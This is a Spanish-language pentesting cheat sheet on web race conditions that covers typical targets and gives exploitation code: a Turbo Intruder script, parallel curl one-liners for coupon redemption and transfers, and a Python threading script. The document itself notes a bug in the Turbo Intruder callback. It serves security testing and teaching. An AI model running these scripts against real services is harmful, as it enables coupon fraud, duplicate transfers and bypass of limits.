# ⚡ Guía rápida de condiciones de carrera

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 ¿Qué son las condiciones de carrera?

Las **condiciones de carrera** (race conditions) surgen cuando el orden o la coincidencia temporal de operaciones puede provocar un comportamiento indebido, como en los fallos de comprobación seguida de uso.

### Impacto
- 💰 **Fraude financiero** - Múltiples canjes
- 🎫 **Abuso de cupones** - Canjear varias veces el mismo código
- 👤 **Escalada de privilegios** - Eludir comprobaciones
- 📂 **Sobrescritura de archivos** - Ataques TOCTOU

---

## 🔍 Objetivos habituales

```
- Canje de cupones y códigos promocionales
- Sistemas de votos o «me gusta»
- Transferencias de dinero
- Operaciones sujetas a límites
- Subidas de archivos
- Restablecimiento de contraseñas
- Verificación de autenticación de dos factores (2FA)
- Registro de cuentas
```

---

## 💉 Técnicas de explotación

### Burp Suite Turbo Intruder

```python
# Enviar varias peticiones simultáneamente
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

> **Corrección del callback:** el ejemplo de Turbo Intruder conserva un fallo del original. Su segundo argumento es el indicador `interesting`, no un objeto de respuesta; el estado se consulta en `req.status` y se añade `req` a la tabla. Por ello `response.status` y `table.add(response)` no siguen la API del [ejemplo oficial](https://raw.githubusercontent.com/PortSwigger/turbo-intruder/master/resources/examples/basic.py).

### Burp Repeater (manual)
```
1. Enviar la petición a Repeater
2. Duplicar la pestaña más de 20 veces
3. Crear un grupo de pestañas
4. Pulsar "Send group (parallel)"
```

### curl en paralelo
```bash
# Enviar 20 peticiones en paralelo
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Con datos POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Hilos en Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Iniciar todos a la vez
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

> **Sincronización:** lanzar hilos o procesos en paralelo no garantiza que las operaciones del servidor coincidan en la ventana vulnerable. El ejemplo de Turbo Intruder tampoco utiliza una compuerta de sincronización. Burp dispone de mecanismos específicos según la versión HTTP; véase la [guía de PortSwigger](https://portswigger.net/web-security/race-conditions).

## 📊 Escenarios habituales

### Condición de carrera en códigos de cupón
```
1. Cupón = 50% de descuento
2. Comportamiento normal: un solo canje
3. Carrera: canjear 10 veces simultáneamente
4. Resultado: 10 pedidos con un 50% de descuento
```

### Elusión de límites
```
1. Límite: 3 descargas al día
2. Carrera: solicitar 10 descargas a la vez
3. La comprobación se realiza simultáneamente
4. Resultado: las 10 peticiones tienen éxito antes de que se aplique el límite
```

### Condición de carrera en la subida de archivos (TOCTOU)
```
1. Subir un archivo → se valida como seguro
2. Antes de moverlo, sustituirlo por uno malicioso
3. El servidor mueve el archivo malicioso en su lugar
```

---

> **Validación del resultado:** los escenarios anteriores son ejemplos, no resultados garantizados. Confirma el estado final de los pedidos, el saldo o el contador y compáralo con peticiones secuenciales; varias respuestas HTTP satisfactorias no prueban por sí solas una condición de carrera. TOCTOU significa *time of check to time of use*: el intervalo entre comprobar un recurso y utilizarlo.

## 🛠️ Herramientas

| Herramienta | Finalidad |
|------|---------|
| **Turbo Intruder** | Extensión de Burp para enviar peticiones en paralelo |
| **race-the-web** | Herramienta en Go para condiciones de carrera |
| **racepwn** | Herramienta Python para condiciones de carrera |

---

## 📚 Recursos

- [Condiciones de carrera de PortSwigger](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ ¡Aprovecha la sincronización!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
